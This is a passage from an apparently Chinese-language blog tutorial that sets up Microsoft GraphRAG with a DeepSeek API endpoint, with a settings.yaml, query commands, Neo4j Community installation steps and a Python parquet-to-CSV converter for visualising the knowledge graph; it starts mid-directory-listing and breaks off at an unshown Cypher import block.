 │  │      chat-7d3d70997c76c4bd512a3020538ca806    │  │      chat-7e4005e318f45c32a29dcbfa13351ac2    │  │      chat-7e4bd47083ec5aa34338012c137d2ba2    │  │      chat-876e73405558a9c5680459c7822dd711    │  │      chat-998f13aa561e5793aaeed2bd4bd8fe68    │  │      chat-9ab3ed5b7281c24a90757032d5951e60    │  │      chat-9c9c6f9c8a587a71969d8b4d9ca2908a    │  │      chat-9e9abf4e0d55b9ae227f297d9b5f5215    │  │      chat-a0b28adbb1e8f8525d7a850c15496fbb    │  │      chat-a336f847197574dc0a40fa378a589480    │  │      chat-a56e7ce13268d9f7e8e12e1c5e4c6e26    │  │      chat-a9f877a576849dd8f4fcfc1dce7ab0c5    │  │      chat-aa0464f36359ee401ed913208d53d5c2    │  │      chat-ab478973d5a34a8a59a199008fc206b8    │  │      chat-afbb1be3681850f2a9ef44a006244733    │  │      chat-bce13bc9ef500314e22ad6355b42f50e    │  │      chat-bfc78eefcdc0965215d68653b30c083f    │  │      chat-c0836b6a8f97567516efa45f7a94277c    │  │      chat-c2ae9aea64b9d86e4415e5aa8316abd6    │  │      chat-cd2b1488110c968a8f53a896f6c1a32f    │  │      chat-cdabd00dd0498d453190672c654477bb    │  │      chat-d70fd65b636c8f57145ab78771f6fbd8    │  │      chat-d82832bb48c027b7c19304cc6b527e4e    │  │      chat-d8e2de0bc5255b04f8e473bfbface9ed    │  │      chat-df6b5ec0f944076f71de96cd65424d7a    │  │      chat-e98922775b9cf30f8f7dbe0eb5fbac28    │  │      chat-eb56da4f497786d8396a1eb58f1dde2e    │  │      chat-ec6bd8525b63dfda444ede9beaf9f6f7    │  │      chat-ecb8dc4edafdaba16e46061f70b8e355    │  │      chat-ee379d70ac019c01d85e3bb5087049c2    │  │      chat-ef7a067fd3ea712a77592afbe4f6de47    │  │      chat-efffe90bffc9bcd92b514faed2d9489e    │  │      chat-f0a7e1fed922a4365bd8f630f5261a24    │  │      chat-f1ca6b11b3308cde9e09db38fc63cbbd    │  │      chat-f48bcac29f5576927d7ae3bea9aa4c98    │  │      chat-f5acc5a055d74f1740d3d58201377339    │  │      chat-f945d689383c8a56cbbe9e574f24d2c2    │  │      chat-f975271f56fd59cb1465f91e07df687d    │  │      chat-fb483c3b2473ce5785cb0146eb5e9c9a    │  │      chat-ff6ef2319f9165f08e545d0767ff924d    │  │    │  ├─summarize_descriptions    │  │      summarize-chat-v2-003e6f17c44fa9f7241ee1527423e43c    │  │      summarize-chat-v2-0111309938aab181470b89060ec24442    │  │      summarize-chat-v2-016bad277a717d5da37080ed5e70b90b    │  │      summarize-chat-v2-024106b87667a5582f378b91f1fdb02a    │  │      summarize-chat-v2-030edb5cfcdbba4e00392de7f6978d6f    │  │      summarize-chat-v2-0b6f437082c883d402fe03096cc5a921    │  │      summarize-chat-v2-0de73858ec7e1d451d7a56fd537fffd8    │  │      summarize-chat-v2-0eed95ca68821a57424c7451f0c6bc06    │  │      summarize-chat-v2-0fe96c5d141c2a059846d92761cef405    │  │      summarize-chat-v2-10f62aea52a0f47f88eb400ed1bddb70    │  │      summarize-chat-v2-110cf5d7261219ff5e391371e9664252    │  │      summarize-chat-v2-13425352b9bfecb77de6565555e9b095    │  │      summarize-chat-v2-138001166023225fcc78359871935641    │  │      summarize-chat-v2-14a34a041a8d88fb6ad6c62d49c817b1    │  │      summarize-chat-v2-15c6b29e3b14c601cf1bb9376e36c18a    │  │      summarize-chat-v2-161910c230526bd72a7567f30eca1908    │  │      summarize-chat-v2-1632daf868840e3cf8a37e9dd0bc9882    │  │      summarize-chat-v2-16548c5df2692c73a9a940dcca94d880    │  │      summarize-chat-v2-16cc1b478baa5458ef16ece91f3f9ae0    │  │      summarize-chat-v2-16e9ea0dfb88d6a405211c09dafaf50b    │  │      summarize-chat-v2-1c15d0040fb14b976fe5404d30d0b83d    │  │      summarize-chat-v2-24aded28ce97c451a60d22b374d6e8c6    │  │      summarize-chat-v2-25fdc49681ec1fc30a1f4a49fa95daf0    │  │      summarize-chat-v2-2a82c53dbb12f5aee6569c0cde068e0e    │  │      summarize-chat-v2-2de4ef3a6f7b35a63189d1a13bbc6829    │  │      summarize-chat-v2-351298e5a217e01311146ab5bda9e104    │  │      summarize-chat-v2-36941f96761fe8e5d947545c9ebc60e9    │  │      summarize-chat-v2-37652d39a35352f3a3f62aa5de0665dd    │  │      summarize-chat-v2-3a77846de17b12ae2181964641e9121f    │  │      summarize-chat-v2-41330bc0bcc627cc476b4e3ffa41262f    │  │      summarize-chat-v2-443fae61b422b9f0f33b393e26eb0911    │  │      summarize-chat-v2-4a16ff9a55ecd9cace1b53388f95ef87    │  │      summarize-chat-v2-4b2c952b232684f2d482ed56d25df57f    │  │      summarize-chat-v2-4d8877e6189fbcaa71306e30a412af8e    │  │      summarize-chat-v2-4e51874a785a49a7680d4e7a381f9892    │  │      summarize-chat-v2-52bcbd68d841d4040ef0d293f45e1433    │  │      summarize-chat-v2-53f8eacd17eac1ec5472a6b24b5087f8    │  │      summarize-chat-v2-548627422eb8ebe543c02f6e669d3234    │  │      summarize-chat-v2-597ba70e28259763ab8ceb945df7b5c5    │  │      summarize-chat-v2-5c945e57b2b8ceb6d6108d7c94240d2c    │  │      summarize-chat-v2-66e9870edc5aeecaac81e064bd0eb6da    │  │      summarize-chat-v2-6dbf79ac2d8fffc26e3fc6adab6b4756    │  │      summarize-chat-v2-6fa0877ac2fbc977860a35bec4a3e0e5    │  │      summarize-chat-v2-7826fa70e94561f6a7860aeb7c9f680c    │  │      summarize-chat-v2-7d9204a8a01163d206642ed445c1aaad    │  │      summarize-chat-v2-82abcd27b01c562c837c158438288460    │  │      summarize-chat-v2-87709b069217dfc06cbe6924c69daf31    │  │      summarize-chat-v2-8a9a5de5f342691e7dbc9a5393770733    │  │      summarize-chat-v2-8ea4dcf284103040937122c641e23c1e    │  │      summarize-chat-v2-90cbce2a26bf49b80231d0c21f1eb029    │  │      summarize-chat-v2-9866dff0c1cdd20dcc7db277b6a0b1b9    │  │      summarize-chat-v2-9beed2e64b45eb4e08d41770053bf516    │  │      summarize-chat-v2-9deffa7a07d9cf882485e488cab07303    │  │      summarize-chat-v2-a51568b0be6075215eee21e542504a8c    │  │      summarize-chat-v2-aa9c47fcafab2db504d500f0a2866061    │  │      summarize-chat-v2-ad24ebb5edc9e698b09b423bfbc90c00    │  │      summarize-chat-v2-af7f06fdbd5ee952541ce212ee70f88e    │  │      summarize-chat-v2-b05dee3e1b76c1f4c185598a2a007e75    │  │      summarize-chat-v2-b0865b2b95d7b6b68e71a7212d5678b5    │  │      summarize-chat-v2-b0e3ba0b0148b262cb7daf5ab3c39fdd    │  │      summarize-chat-v2-b3026421439fce8149f12dedb11dd1a6    │  │      summarize-chat-v2-b46137131e6df3b6b9e7a02298941b8b    │  │      summarize-chat-v2-b8decc33711671985a62f54a51d8f237    │  │      summarize-chat-v2-ba689229a075298f86efb17a66ea1825    │  │      summarize-chat-v2-bd242600da735741d4828fee4ec0bf76    │  │      summarize-chat-v2-bd78c8df3c2165c20664d28755b4dc20    │  │      summarize-chat-v2-d285f69cdaf28421c6e1c41905fea14d    │  │      summarize-chat-v2-d74f4b71256d0864621c05d2b6d62e12    │  │      summarize-chat-v2-d7fbfff54e8e1a93cc5b044c8378a295    │  │      summarize-chat-v2-d935666422858760baa4aed4ba679b96    │  │      summarize-chat-v2-e18e32ec57028de6014746ae6757baea    │  │      summarize-chat-v2-e4a25834ee69b75748928a26fa3fc027    │  │      summarize-chat-v2-e811fe09014b24b60867835f28d61bdb    │  │      summarize-chat-v2-ec0b9ff923f8340777e0d12299acf89e    │  │      summarize-chat-v2-ecfdeeaca201c64a9fe074f7f93f63ba    │  │      summarize-chat-v2-f07a87ad14a82c1aab91d449341810c0    │  │      summarize-chat-v2-f88aad56197e5a6b0fe0065431fd46b3    │  │      summarize-chat-v2-f8c0918e1dfd851196599de97b3198c0    │  │      summarize-chat-v2-f8f8a0a88c9a162e274888a79a81e5e7    │  │    │  └─text_embedding    │          embedding-0609f21a0bdf6154b03521b48c8af1ca    │          embedding-097d6b5d89865a9762d8b7cc4fd8ee6a    │          embedding-19c35e988be1a687105874580195806e    │          embedding-614b486ac95aaa1cbc4a2446afdac601    │          embedding-7c5eef2cb4b2d0fa93f052a4a759be3b    │          embedding-9aaa300ba484af06e980a31dd0b418bb    │          embedding-a367fcefe3261ded72b5661a121a711f    │          embedding-a81e03fdd29a9a6cc98e6e29ebab6095    │    ├─input    │      book.txt    │    ├─output    │  ├─20240820-100343    │  │  └─reports    │  │          indexing-engine.log    │  │    │  └─20240820-100459    │      ├─artifacts    │      │      create_base_documents.parquet    │      │      create_base_entity_graph.parquet    │      │      create_base_extracted_entities.parquet    │      │      create_base_text_units.parquet    │      │      create_final_communities.parquet    │      │      create_final_community_reports.parquet    │      │      create_final_documents.parquet    │      │      create_final_entities.parquet    │      │      create_final_nodes.parquet    │      │      create_final_relationships.parquet    │      │      create_final_text_units.parquet    │      │      create_summarized_entities.parquet    │      │      join_text_units_to_entity_ids.parquet    │      │      join_text_units_to_relationship_ids.parquet    │      │      stats.json    │      │    │      └─reports    │              indexing-engine.log    │              logs.json    │    └─prompts            claim_extraction.txt            community_report.txt            entity_extraction.txt            summarize_descriptions.txt</code></pre></details>查询指令  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m graphrag.query --root ./test --method global <span class="string">&quot;你要问的问题&quot;</span></span><br></pre></td></tr></table></figure><p>–method可以有global和local两种方式</p><p>目前好像对中文文本的支持不是很好，在进行中文文本的索引构建时总报错。</p><h3 id="1-3使用deepseek大模型进行本地部署"><a href="#1-3使用deepseek大模型进行本地部署" class="headerlink" title="1.3使用deepseek大模型进行本地部署"></a>1.3使用deepseek大模型进行本地部署</h3><p>使用国内大模型api接口<br>官网:<a href="https://agicto.com/">https://agicto.com/</a><br>只需要更改初始化后产生的.env和settings.yaml文件<br>获取api密钥后将.env和settings.yaml文件更改成如下内容:<br>.env文件:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRAPHRAG_API_KEY=你的密钥</span><br></pre></td></tr></table></figure><p>setting.yaml文件</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">encoding_model: cl100k_base</span><br><span class="line">skip_workflows: []</span><br><span class="line">llm:</span><br><span class="line">  api_key: $&#123;GRAPHRAG_API_KEY&#125;</span><br><span class="line">  type: openai_chat # or azure_openai_chat</span><br><span class="line">  model: deepseek-chat</span><br><span class="line">  model_supports_json: false # recommended if this is available for your model.</span><br><span class="line">  # max_tokens: 4000</span><br><span class="line">  # request_timeout: 180.0</span><br><span class="line">  api_base: https://api.agicto.cn/v1</span><br><span class="line">  # api_version: 2024-02-15-preview</span><br><span class="line">  # organization: &lt;organization_id&gt;</span><br><span class="line">  # deployment_name: &lt;azure_model_deployment_name&gt;</span><br><span class="line">  # tokens_per_minute: 150_000 # set a leaky bucket throttle</span><br><span class="line">  # requests_per_minute: 10_000 # set a leaky bucket throttle</span><br><span class="line">  # max_retries: 10</span><br><span class="line">  # max_retry_wait: 10.0</span><br><span class="line">  # sleep_on_rate_limit_recommendation: true # whether to sleep when azure suggests wait-times</span><br><span class="line">  # concurrent_requests: 25 # the number of parallel inflight requests that may be made</span><br><span class="line">  # temperature: 0 # temperature for sampling</span><br><span class="line">  # top_p: 1 # top-p sampling</span><br><span class="line">  # n: 1 # Number of completions to generate</span><br><span class="line"></span><br><span class="line">parallelization:</span><br><span class="line">  stagger: 0.3</span><br><span class="line">  # num_threads: 50 # the number of threads to use for parallel processing</span><br><span class="line"></span><br><span class="line">async_mode: threaded # or asyncio</span><br><span class="line"></span><br><span class="line">embeddings:</span><br><span class="line">  ## parallelization: override the global parallelization settings for embeddings</span><br><span class="line">  async_mode: threaded # or asyncio</span><br><span class="line">  llm:</span><br><span class="line">    api_key: $&#123;GRAPHRAG_API_KEY&#125;</span><br><span class="line">    type: openai_embedding # or azure_openai_embedding</span><br><span class="line">    model: text-embedding-3-small</span><br><span class="line">    api_base: https://api.agicto.cn/v1</span><br><span class="line">    # api_version: 2024-02-15-preview</span><br><span class="line">    # organization: &lt;organization_id&gt;</span><br><span class="line">    # deployment_name: &lt;azure_model_deployment_name&gt;</span><br><span class="line">    # tokens_per_minute: 150_000 # set a leaky bucket throttle</span><br><span class="line">    # requests_per_minute: 10_000 # set a leaky bucket throttle</span><br><span class="line">    # max_retries: 10</span><br><span class="line">    # max_retry_wait: 10.0</span><br><span class="line">    # sleep_on_rate_limit_recommendation: true # whether to sleep when azure suggests wait-times</span><br><span class="line">    # concurrent_requests: 25 # the number of parallel inflight requests that may be made</span><br><span class="line">    # batch_size: 16 # the number of documents to send in a single request</span><br><span class="line">    # batch_max_tokens: 8191 # the maximum number of tokens to send in a single request</span><br><span class="line">    # target: required # or optional</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunks:</span><br><span class="line">  size: 300</span><br><span class="line">  overlap: 100</span><br><span class="line">  group_by_columns: [id] # by default, we don&#x27;t allow chunks to cross documents</span><br><span class="line">    </span><br><span class="line">input:</span><br><span class="line">  type: file # or blob</span><br><span class="line">  file_type: text # or csv</span><br><span class="line">  base_dir: &quot;input&quot;</span><br><span class="line">  file_encoding: utf-8</span><br><span class="line">  file_pattern: &quot;.*\\.txt$&quot;</span><br><span class="line"></span><br><span class="line">cache:</span><br><span class="line">  type: file # or blob</span><br><span class="line">  base_dir: &quot;cache&quot;</span><br><span class="line">  # connection_string: &lt;azure_blob_storage_connection_string&gt;</span><br><span class="line">  # container_name: &lt;azure_blob_storage_container_name&gt;</span><br><span class="line"></span><br><span class="line">storage:</span><br><span class="line">  type: file # or blob</span><br><span class="line">  base_dir: &quot;output/$&#123;timestamp&#125;/artifacts&quot;</span><br><span class="line">  # connection_string: &lt;azure_blob_storage_connection_string&gt;</span><br><span class="line">  # container_name: &lt;azure_blob_storage_container_name&gt;</span><br><span class="line"></span><br><span class="line">reporting:</span><br><span class="line">  type: file # or console, blob</span><br><span class="line">  base_dir: &quot;output/$&#123;timestamp&#125;/reports&quot;</span><br><span class="line">  # connection_string: &lt;azure_blob_storage_connection_string&gt;</span><br><span class="line">  # container_name: &lt;azure_blob_storage_container_name&gt;</span><br><span class="line"></span><br><span class="line">entity_extraction:</span><br><span class="line">  ## llm: override the global llm settings for this task</span><br><span class="line">  ## parallelization: override the global parallelization settings for this task</span><br><span class="line">  ## async_mode: override the global async_mode settings for this task</span><br><span class="line">  prompt: &quot;prompts/entity_extraction.txt&quot;</span><br><span class="line">  entity_types: [organization,person,geo,event]</span><br><span class="line">  max_gleanings: 0</span><br><span class="line"></span><br><span class="line">summarize_descriptions:</span><br><span class="line">  ## llm: override the global llm settings for this task</span><br><span class="line">  ## parallelization: override the global parallelization settings for this task</span><br><span class="line">  ## async_mode: override the global async_mode settings for this task</span><br><span class="line">  prompt: &quot;prompts/summarize_descriptions.txt&quot;</span><br><span class="line">  max_length: 500</span><br><span class="line"></span><br><span class="line">claim_extraction:</span><br><span class="line">  ## llm: override the global llm settings for this task</span><br><span class="line">  ## parallelization: override the global parallelization settings for this task</span><br><span class="line">  ## async_mode: override the global async_mode settings for this task</span><br><span class="line">  # enabled: true</span><br><span class="line">  prompt: &quot;prompts/claim_extraction.txt&quot;</span><br><span class="line">  description: &quot;Any claims or facts that could be relevant to information discovery.&quot;</span><br><span class="line">  max_gleanings: 0</span><br><span class="line"></span><br><span class="line">community_reports:</span><br><span class="line">  ## llm: override the global llm settings for this task</span><br><span class="line">  ## parallelization: override the global parallelization settings for this task</span><br><span class="line">  ## async_mode: override the global async_mode settings for this task</span><br><span class="line">  prompt: &quot;prompts/community_report.txt&quot;</span><br><span class="line">  max_length: 2000</span><br><span class="line">  max_input_length: 8000</span><br><span class="line"></span><br><span class="line">cluster_graph:</span><br><span class="line">  max_cluster_size: 10</span><br><span class="line"></span><br><span class="line">embed_graph:</span><br><span class="line">  enabled: false # if true, will generate node2vec embeddings for nodes</span><br><span class="line">  # num_walks: 10</span><br><span class="line">  # walk_length: 40</span><br><span class="line">  # window_size: 2</span><br><span class="line">  # iterations: 3</span><br><span class="line">  # random_seed: 597832</span><br><span class="line"></span><br><span class="line">umap:</span><br><span class="line">  enabled: false # if true, will generate UMAP embeddings for nodes</span><br><span class="line"></span><br><span class="line">snapshots:</span><br><span class="line">  graphml: false</span><br><span class="line">  raw_entities: false</span><br><span class="line">  top_level_nodes: false</span><br><span class="line"></span><br><span class="line">local_search:</span><br><span class="line">  # text_unit_prop: 0.5</span><br><span class="line">  # community_prop: 0.1</span><br><span class="line">  # conversation_history_max_turns: 5</span><br><span class="line">  # top_k_mapped_entities: 10</span><br><span class="line">  # top_k_relationships: 10</span><br><span class="line">  # llm_temperature: 0 # temperature for sampling</span><br><span class="line">  # llm_top_p: 1 # top-p sampling</span><br><span class="line">  # llm_n: 1 # Number of completions to generate</span><br><span class="line">  # max_tokens: 12000</span><br><span class="line"></span><br><span class="line">global_search:</span><br><span class="line">  # llm_temperature: 0 # temperature for sampling</span><br><span class="line">  # llm_top_p: 1 # top-p sampling</span><br><span class="line">  # llm_n: 1 # Number of completions to generate</span><br><span class="line">  # max_tokens: 12000</span><br><span class="line">  # data_max_tokens: 12000</span><br><span class="line">  # map_max_tokens: 1000</span><br><span class="line">  # reduce_max_tokens: 2000</span><br><span class="line">  # concurrency: 32</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后继续构建索引:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m graphrag.index --root ./test</span><br></pre></td></tr></table></figure><p>采用api接口后，这一步骤时间将缩短至10分钟以内</p><h3 id="1-4-对GraphRAG的工作流程简单分析"><a href="#1-4-对GraphRAG的工作流程简单分析" class="headerlink" title="1.4 对GraphRAG的工作流程简单分析"></a>1.4 对GraphRAG的工作流程简单分析</h3><p>GraphRAG工作流程输出结果:<br><img src="/img/AI_project/KnowledgeGraph/index.png" alt="image"><br>大致工作原理:<br>构建索引阶段:<br><img src="/img/AI_project/KnowledgeGraph/2.png" alt="image"><br>问答阶段:<br><img src="/img/AI_project/KnowledgeGraph/3.png" alt="image"><br>简述:<br>GraphRAG会对给定的文本文件进行分块处理，每块文段进行命名实体识别，抽取其中的相互关系，再将实体进行分类，形成社区，然后形成社区报告，完成索引的构建。<br>其中大部分工作是由给定的api接口完成的。在graphrag&#x2F;test&#x2F;prompts目录下的文本文件就展示了graphrag向大模型输入的一些工作指令，将具体要完成的工作写在了文本文件里。<br>在进行问答时有两种不同的模式，global和local，两者所适用的问题类型有所不同。<br>global模式适合回答全局性的问题，在对各个社区进行总结后得到结果，消耗的资源比较大；<br>local模式适合回答局域性的问题，消耗资源小。</p><h2 id="2-Neo4j可视化知识图谱"><a href="#2-Neo4j可视化知识图谱" class="headerlink" title="2. Neo4j可视化知识图谱"></a>2. Neo4j可视化知识图谱</h2><h3 id="2-1-Neo4j部署"><a href="#2-1-Neo4j部署" class="headerlink" title="2.1 Neo4j部署"></a>2.1 Neo4j部署</h3><p>neo4j下载地址:<a href="https://neo4j.com/deployment-center/#enterprise">https://neo4j.com/deployment-center/#enterprise</a><br>进入页面:<br><img src="/img/AI_project/KnowledgeGraph/4.png" alt="image">  </p><p>往下翻到:<br><img src="/img/AI_project/KnowledgeGraph/5.png" alt="image">  </p><p>注意选择不收费的COMMUNITY版本和Windows系统版本  </p><p>点击Download后会下载压缩包neo4j-community-5.23.0-windows.zip  </p><p>解压后得到文件夹neo4j-community-5.23.0-windows.zip  </p><p>可以选择将其中的bin目录设置为环境变量，方便后续命令行输入  </p><p>配置好环境变量后运行以下命令开启neo4j服务:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neo4j.bat console</span><br></pre></td></tr></table></figure><p>默认打开7474端口，在浏览器中搜索 <a href="http://localhost:7474/">http://localhost:7474</a> 即可访问UI界面</p><p>初始用户名和密码均为 <em><strong>neo4j</strong></em></p><h3 id="2-2-将GraphRAG进行可视化操作"><a href="#2-2-将GraphRAG进行可视化操作" class="headerlink" title="2.2 将GraphRAG进行可视化操作"></a>2.2 将GraphRAG进行可视化操作</h3><ol><li><p>经过索引构建后test&#x2F;output&#x2F;时间戳&#x2F;artifacts目录下会生成一系列.parquet文件，首先将这些文件转换成.csv文件<br>转换代码:</p> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import pandas as pd</span><br><span class="line">import csv</span><br><span class="line"></span><br><span class="line">parquet_dir = &quot;./output_csv/test6/parquet&quot;   # .parquet文件所在目录</span><br><span class="line">csv_dir = &quot;./output_csv/test6/csv&quot;           # .csv文件的生成存放目录</span><br><span class="line"></span><br><span class="line">def clean_quote(value):</span><br><span class="line">    if isinstance(value, str):</span><br><span class="line">        value = value.strip().replace(&#x27;&quot;&quot;&#x27;, &#x27;&quot;&#x27;).replace(&#x27;&quot;&#x27;, &#x27;&#x27;)</span><br><span class="line">        if &#x27;,&#x27; in value or &#x27;&quot;&#x27; in value:</span><br><span class="line">            value = f&#x27;&quot;&#123;value&#125;&quot;&#x27;</span><br><span class="line">    return value</span><br><span class="line"></span><br><span class="line">for file_name in os.listdir(parquet_dir):</span><br><span class="line">    if file_name.endswith(&#x27;.parquet&#x27;):</span><br><span class="line">        parquet_file = os.path.join(parquet_dir, file_name)</span><br><span class="line">        csv_file = os.path.join(csv_dir, file_name.replace(&#x27;.parquet&#x27;, &#x27;.csv&#x27;))</span><br><span class="line"></span><br><span class="line">        df = pd.read_parquet(parquet_file)</span><br><span class="line"></span><br><span class="line">        for column in df.select_dtypes(include=[&#x27;object&#x27;]).columns:</span><br><span class="line">            df[column] = df[column].apply(clean_quote)</span><br><span class="line"></span><br><span class="line">        df.to_csv(csv_file, index=False, quoting=csv.QUOTE_NONNUMERIC)</span><br><span class="line">        print(f&quot;Converted &#123;parquet_file&#125; to &#123;csv_file&#125; successfully.&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;All Parquet files have been converted to CSV.&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>将生成的csv文件复制到neo4j-community-5.23.0-windows&#x2F;import目录下  </p></li><li><p>开启neo4j服务并进入UI界面，在页面上方复制以下命令并运行命令:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">// 